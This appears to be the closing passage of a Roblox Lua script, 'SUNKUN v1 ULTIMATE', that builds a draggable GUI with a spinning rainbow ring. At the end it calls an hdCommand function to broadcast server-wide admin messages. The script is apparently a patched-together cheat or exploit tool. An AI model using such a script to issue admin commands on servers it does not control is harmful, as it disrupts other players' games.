local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X, 
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- 更新滚动框架大小
local function updateScrollSize(frame)
    local buttonCount = 0
    for _, child in pairs(frame:GetChildren()) do
        if child:IsA("TextButton") then
            buttonCount = buttonCount + 1
        end
    end
    
    local rows = math.ceil(buttonCount / 3)
    local height = rows * 45 + 20
    frame.CanvasSize = UDim2.new(0, 0, 0, height)
end

-- 延迟更新滚动框架大小
task.spawn(function()
    task.wait(0.5)
    updateScrollSize(scrollFrame)
    updateScrollSize(clientScroll)
    updateScrollSize(newScroll)
    updateScrollSize(teamScroll)
end)

-- 添加彩虹环UI (来自z00kiddl GUI)
task.delay(1, function()
    local ringGui = Instance.new("ScreenGui")
    ringGui.Name = "RainbowRingUI"
    ringGui.Parent = player:WaitForChild("PlayerGui")
    ringGui.ResetOnSpawn = false
    
    local ring = Instance.new("ImageLabel")
    ring.Size = UDim2.new(0, 135, 0, 135)
    ring.AnchorPoint = Vector2.new(0.5, 0.5)
    ring.Position = UDim2.new(0.5, 0, 0.5, 0)
    ring.BackgroundTransparency = 1
    ring.Image = "rbxassetid://80607924147749"
    ring.ImageTransparency = 0
    ring.Parent = ringGui
    
    ring:TweenPosition(UDim2.new(0.04, 0, 0.82, 0), "Out", "Sine", 0.7, false)
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 165, 0)),
        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 127, 255)),
        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(139, 0, 255)),
        ColorSequenceKeypoint.new(1.0, Color3.fromRGB(255, 0, 0))
    })
    gradient.Parent = ring
    
    while task.wait(0.03) do
        ring.Rotation = (ring.Rotation + 2) % 360
        gradient.Rotation = (gradient.Rotation + 5) % 360
    end
end)

-- 启动消息
task.spawn(function()
    task.wait(1)
    hdCommand(";serverMessage SUNKUN v1 ULTIMATE 已加载！包含所有功能！")
    hdCommand(";serverhint 使用TAB键切换功能标签页")
end)

print("sunkun v1 脚本加载完成！")
print("缝合万岁！")
